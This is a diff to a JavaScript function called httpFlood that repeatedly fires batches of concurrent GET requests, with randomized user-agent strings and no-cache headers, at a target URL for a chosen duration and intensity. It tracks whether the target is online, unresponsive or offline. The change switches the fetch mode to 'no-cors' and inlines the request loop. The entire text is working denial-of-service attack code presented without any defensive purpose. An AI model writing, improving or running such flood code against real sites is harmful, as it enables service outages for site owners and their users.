@@ -3,7 +3,6 @@ async function httpFlood(target, duration, intensity) {
   let targetStatus = 'Online';
   let mbps = 0;
   const startTime = Date.now();
-  let endTime = startTime + duration * 1000;
 
   try {
     const url = new URL(target);
@@ -28,46 +27,34 @@ async function httpFlood(target, duration, intensity) {
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
     ];
 
-    async function sendRequest() {
-      if (Date.now() >= endTime) {
-        return;
-      }
-      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-      const requestOptions = {
-        method: 'GET',
-        headers: {
-          'User-Agent': userAgent,
-          'X-Noodles-Bot': 'Active',
-          'Cache-Control': 'no-cache',
-          'Connection': 'keep-alive'
-        },
-        mode: 'cors'
-      };
-
-      try {
-        const response = await fetch(target, requestOptions);
-        if (response.ok) {
-          packetsSent++;
-          const contentLength = response.headers.get('content-length');
-          if (contentLength) {
-            mbps += parseInt(contentLength, 10) / 1000000;
-          } else {
-            mbps += 0.1;
-          }
-          targetStatus = 'Online';
-        } else {
-          targetStatus = 'Unresponsive';
-        }
-        await response.text();
-      } catch (error) {
-        targetStatus = 'Offline';
-      }
-    }
-
-    while (Date.now() < endTime) {
+    while (Date.now() - startTime < duration * 1000) {
       const promises = [];
       for (let i = 0; i < intensity; i++) {
-        promises.push(sendRequest());
+        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+        const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;
+
+        const promise = fetch(target, {
+            method: 'GET',
+            headers: {
+              'User-Agent': userAgent,
+              'X-Noodles-Bot': 'Active',
+              'Cache-Control': 'no-cache',
+              'Connection': 'keep-alive'
+            },
+            mode: 'no-cors'
+          })
+          .then(response => {
+            if (response.ok) {
+              packetsSent++;
+              mbps += payload.length / 1000000;
+            } else {
+              targetStatus = 'Unresponsive';
+            }
+          })
+          .catch(error => {
+            targetStatus = 'Offline';
+          });
+        promises.push(promise);
       }
       await Promise.all(promises);
       await new Promise(resolve => setTimeout(resolve, interval));
